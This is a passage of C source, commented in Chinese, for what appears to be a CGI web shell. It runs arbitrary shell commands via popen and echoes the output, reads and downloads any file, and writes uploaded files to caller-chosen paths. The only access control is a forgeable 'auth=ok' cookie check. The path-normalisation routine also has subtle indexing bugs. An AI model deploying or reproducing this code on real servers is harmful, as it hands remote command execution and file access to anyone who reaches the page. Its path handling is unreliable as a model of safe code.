// ===================== 修复1：重写正确的路径规范化函数（核心修复） =====================
// 正确处理 ../ ./ // 转换为绝对路径，杜绝路径错误
void safe_path(char *path) {
    if (!path || strlen(path) == 0) {
        strcpy(path, "/");
        return;
    }

    char tmp[MAX_PATH] = {0};
    char res[MAX_PATH] = {0};
    char *parts[256] = {0}; // 路径分段存储
    int part_cnt = 0;
    int i;

    // 统一替换反斜杠、处理//
    for (i = 0; path[i]; i++) {
        if (path[i] == '\\') tmp[i] = '/';
        else if (path[i] == '/' && tmp[strlen(tmp)-1] == '/') continue;
        else tmp[i] = path[i];
    }

    // 分割路径
    char *token = strtok(tmp, "/");
    while (token) {
        if (strcmp(token, ".") == 0) { // 忽略 ./
            token = strtok(NULL, "/");
            continue;
        }
        if (strcmp(token, "..") == 0) { // 回退上级目录
            if (part_cnt > 0) part_cnt--;
        } else {
            parts[part_cnt++] = token;
        }
        token = strtok(NULL, "/");
    }

    // 拼接最终安全路径
    strcat(res, "/");
    for (i = 0; i < part_cnt; i++) {
        strcat(res, parts[i]);
        if (i < part_cnt - 1) strcat(res, "/");
    }

    // 处理根目录
    if (strlen(res) == 0) strcpy(res, "/");
    strncpy(path, res, MAX_PATH-1);
}

// URL解码（修复+号转义）
void url_decode(char *str) {
    char *p = str;
    while (*str) {
        if (*str == '%' && *(str+1) && *(str+2)) {
            char hex[3] = {*(str+1), *(str+2), '\0'};
            *p = (char)strtol(hex, NULL, 16);
            str += 3;
        } else if (*str == '+') {
            *p = ' ';
            str++;
        } else {
            *p = *str;
            str++;
        }
        p++;
    }
    *p = '\0';
}

// JS路径转义
void escape_js_string(char *src, char *dest) {
    int i = 0, j = 0;
    while (src[i] && j < MAX_PATH-1) {
        if (src[i] == '"') { dest[j++] = '\\'; dest[j++] = '"'; }
        else if (src[i] == '\'') { dest[j++] = '\\'; dest[j++] = '\''; }
        else if (src[i] == '\\') { dest[j++] = '\\'; dest[j++] = '\\'; }
        else if (src[i] == '/') { dest[j++] = '\\'; dest[j++] = '/'; }
        else if (src[i] == ' ') { dest[j++] = '\\'; dest[j++] = ' '; }
        else dest[j++] = src[i];
        i++;
    }
    dest[j] = '\0';
}

// 执行命令
void exec_cmd(const char *cmd) {
    if (!cmd || strlen(cmd) == 0) return;
    char full_cmd[MAX_BUF];
    snprintf(full_cmd, sizeof(full_cmd), "%s 2>/dev/null", cmd);
    FILE *fp = popen(full_cmd, "r");
    if (!fp) { printf("<pre>Command error: %s</pre>", strerror(errno)); return; }

    char buf[MAX_BUF];
    printf("<pre>[CMD] %s\n", cmd);
    while (fgets(buf, sizeof(buf), fp)) fputs(buf, stdout);
    printf("</pre>");
    pclose(fp);
}

// HTML转义输出文件内容
void read_file_escape(const char *path) {
    if (strlen(path) == 0) return;
    FILE *fp = fopen(path, "r");
    if (!fp) {
        printf("<pre>Read file failed: %s</pre>", strerror(errno));
        return;
    }
    char buf[MAX_BUF];
    printf("<pre>");
    while (fgets(buf, sizeof(buf), fp)) {
        for (int i=0; buf[i]; i++) {
            if (buf[i] == '&') printf("&amp;");
            else if (buf[i] == '<') printf("&lt;");
            else if (buf[i] == '>') printf("&gt;");
            else putchar(buf[i]);
        }
    }
    printf("</pre>");
    fclose(fp);
}

// 解析Cookie登录态
int check_cookie() {
    char *cookie = getenv("HTTP_COOKIE");
    if (!cookie) return 0;
    return (strstr(cookie, "auth=ok") != NULL);
}

// 计算父目录
void get_parent_dir(char *current, char *parent) {
    strncpy(parent, current, MAX_PATH-1);
    safe_path(parent); // 修复：规范化父路径
    char *last = strrchr(parent, '/');
    if (last && last > parent) *last = '\0';
    else strcpy(parent, "/");
    safe_path(parent);
}

// 文件下载
void download_file(const char *path) {
    if (strlen(path) == 0) return;
    struct stat st;
    if (stat(path, &st) != 0 || !S_ISREG(st.st_mode)) {
        printf("Content-Type: text/html; charset=utf-8\r\n\r\n");
        printf("<pre>Download failed: %s</pre>", strerror(errno));
        return;
    }

    char fname[MAX_FILENAME];
    char *p = strrchr(path, '/');
    strcpy(fname, p ? p+1 : path);

    printf("Content-Type: application/octet-stream\r\n");
    printf("Content-Disposition: attachment; filename=\"%s\"\r\n\r\n", fname);

    FILE *fp = fopen(path, "rb");
    char buf[MAX_BUF];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), fp)) > 0) {
        fwrite(buf, 1, n, stdout);
    }
    fclose(fp);
    exit(0);
}

// ===================== 修复2：兼容所有浏览器的上传解析（处理带引号的boundary） =====================
// ===================== 修复3：自动处理路径末尾/，杜绝拼接错误 =====================
void handle_upload(const char *content_type, const char *buf, const char *savepath) {
    if (!content_type || strstr(content_type, "multipart/form-data") == NULL) return;

    char boundary[MAX_BUF] = {0};
    // 兼容 boundary="xxx" 和 boundary=xxx 两种格式
    if (strstr(content_type, "boundary=\"")) {
        sscanf(content_type, "multipart/form-data; boundary=\"%[^\"]\"", boundary);
    } else {
        sscanf(content_type, "multipart/form-data; boundary=%s", boundary);
    }
    if (strlen(boundary) == 0) return;

    char full_boundary[MAX_BUF] = {0};
    snprintf(full_boundary, sizeof(full_boundary), "--%s", boundary);

    // 解析文件名
    char *upload_start = strstr(buf, "filename=\"");
    if (!upload_start) return;
    upload_start += 10;
    char *filename_end = strchr(upload_start, '"');
    if (!filename_end) return;
    *filename_end = '\0';

    // 解析文件内容
    char *file_content = strstr(filename_end + 1, "\r\n\r\n");
    if (!file_content) return;
    file_content += 4;
    char *file_end = strstr(file_content, full_boundary);
    if (!file_end) file_end = strstr(file_content, boundary);
    if (!file_end) return;
    file_end -= 4;

    // ===================== 核心修复：自动补全路径末尾的/，杜绝拼接错误 =====================
    char safe_save[MAX_PATH] = {0};
    strncpy(safe_save, savepath, MAX_PATH-1);
    safe_path(safe_save);
    int len = strlen(safe_save);
    if (len > 0 && safe_save[len-1] != '/') {
        safe_save[len] = '/';
        safe_save[len+1] = '\0';
    }

    // 检查上传目录是否存在，不存在则创建
    struct stat st;
    if (stat(safe_save, &st) != 0 || !S_ISDIR(st.st_mode)) {
        mkdir(safe_save, 0755); // 自动创建目录
    }

    // 拼接最终上传路径
    char full_path[MAX_PATH] = {0};
    snprintf(full_path, sizeof(full_path), "%s%s", safe_save, upload_start);
    safe_path(full_path);

    FILE *fp = fopen(full_path, "wb");
    if (!fp) {
        printf("<pre>Upload failed: %s (Path: %s)</pre>", strerror(errno), full_path);
        return;
    }

    fwrite(file_content, 1, file_end - file_content, fp);
    fclose(fp);
    printf("<pre>✅ Upload success: %s</pre>", full_path);
}

// ===================== 修复4：兼容Nginx/Apache的CGI环境变量 =====================
char* get_cgi_var(const char* var) {
    char* val = getenv(var);
    if (val) return val;
    // 兼容Nginx格式：HTTP_前缀
    char http_var[128] = {0};
    snprintf(http_var, sizeof(http_var), "HTTP_%s", var);
    return getenv(http_var);
}
